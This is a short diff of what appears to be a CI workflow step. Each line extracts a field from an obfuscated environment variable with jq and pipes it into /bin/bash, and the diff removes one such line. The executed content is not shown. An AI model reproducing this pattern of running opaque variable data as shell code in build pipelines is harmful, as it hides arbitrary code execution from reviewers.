@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$pys78" | jq -r .pyfu9 | /bin/bash
           echo $owt5110 | jq -r .gzze6 | /bin/bash
-          echo $kdyf7 | jq -r .cs8471 | /bin/bash
           echo $iqghi4 | jq -r .ha1657 | /bin/bash
           printf '%s' "$tazlm1328" | jq -r .piad98 | /bin/bash
 
